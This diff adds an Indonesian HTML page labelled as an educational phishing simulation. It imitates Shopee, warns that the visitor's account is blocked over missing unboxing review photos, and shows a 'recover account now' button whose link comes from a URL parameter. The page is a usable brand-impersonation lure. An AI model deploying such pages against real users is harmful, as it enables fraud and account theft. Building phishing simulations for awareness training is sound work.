@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Edukasi Simulasi - Tampilan Phishing</title>
+    <style>
+        /* Reset dan pengaturan dasar */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Arial', sans-serif;
+        }
+
+        /* Container utama dengan ukuran persis 1051x1280 */
+        .simulation-container {
+            width: 1051px;
+            height: 1280px;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0 100px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Logo Shopee */
+        /* Container untuk membungkus logo agar presisi di tengah */
+        .logo-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 110px;
+            /* Jarak dari batas atas halaman */
+            margin-bottom: 70px;
+            /* Jarak dari logo ke teks peringatan */
+        }
+
+        /* Mengatur dimensi gambar logo (misal: ikon tas saja) */
+        .logo-container img {
+            width: 200px;
+            height: auto;
+            object-fit: contain;
+        }
+
+        /* Teks "Shopee" di sebelah kanan logo */
+        .logo-text {
+            font-size: 140px; /* Ukuran besar agar seimbang dengan ikon 200px */
+            font-weight: small-caps;
+            color: #fb5533;
+            margin-top: 50px; /* Warna oranye khas */
+            margin-left: 30px; /* Jarak antara ikon dan teks */
+            letter-spacing: -2px; /* Merapatkan jarak antar huruf agar mirip logo asli */
+        }
+
+        /* Header Peringatan */
+        .alert-header {
+            font-size: 46px;
+            font-weight: 800;
+            color: #c92a2a;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            letter-spacing: 1px;
+        }
+
+        .sub-alert {
+            font-size: 26px;
+            color: #e59999;
+            letter-spacing: 2px;
+            margin-bottom: 70px;
+            font-weight: bold;
+        }
+
+        /* Paragraf Utama */
+        .main-text {
+            font-size: 26px;
+            line-height: 2.1;
+            text-align: justify;
+            color: #1a1a1a;
+            font-weight: 500;
+            margin-bottom: 90px;
+        }
+
+        .main-text strong {
+            font-weight: 800;
+            font-size: 28px;
+        }
+
+        /* Instruksi */
+        .instruction {
+            font-size: 32px;
+            color: #d35400;
+            margin-bottom: 50px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            font-weight: 500;
+        }
+
+        /* Tombol */
+        .btn-recover {
+            display: block;
+            width: 100%;
+            background-color: #fb5533;
+            color: #ffffff;
+            font-size: 42px;
+            font-weight: bold;
+            text-align: center;
+            padding: 35px 0;
+            border-radius: 25px;
+            text-decoration: none;
+            cursor: pointer;
+            border: none;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .btn-recover:hover {
+            background-color: #e64a2e;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="simulation-container">
+        <div class="logo-container">
+            <img src="logo.png" alt="Shopee Logo">
+            <span class="logo-text">Shopee</span>
+        </div>
+
+        <div class="alert-header">
+            🚫AKUNMU🚫TERBLOKIR🚫
+        </div>
+
+        <div class="sub-alert">
+            «TERDETEKSI PELANGGARAN»
+        </div>
+
+        <div class="main-text">
+            AKUNMU TERBLOKIR TIDAK DAPAT DIGUNAKAN SEMENTARA TELAH TERDETEKSI MELANGGAR KEBIJAK ATURAN YANG TELAH
+            TETAPKAN OLEH SHOPEE SEPERTI TIDAK UNGGAH <strong>foto video</strong> PADA ULASAN TOKO PADA BOX PAKET SUDAH
+            DI PERINGATKAN (<strong>WAJIB</strong>) UNBOXING SETELAH DI ANALISA ULANG ITU PENYEBAB MERUGIKAN TOKO🛍️📦
+        </div>
+
+        <div class="instruction">
+            ⏳ SILAHKAN MELAKUKAN pemulihan dibawah
+        </div>
+
+        <a id="recoverLink" class="btn-recover" href="#" target="_blank" rel="noopener">
+            Pulihkan Akun Sekarang
+        </a>
+    </div>
+
+    <script>
+        (function () {
+            const params = new URLSearchParams(window.location.search);
+            const guestLink = params.get('guest_link') || params.get('link') || '';
+            const recoverLink = document.getElementById('recoverLink');
+
+            if (!recoverLink) return;
+
+            if (guestLink) {
+                recoverLink.href = guestLink;
+                return;
+            }
+
+            recoverLink.addEventListener('click', function (event) {
+                event.preventDefault();
+                alert('Link halaman guest belum tersedia.');
+            });
+        })();
+    </script>
+
+</body>
+
+</html>
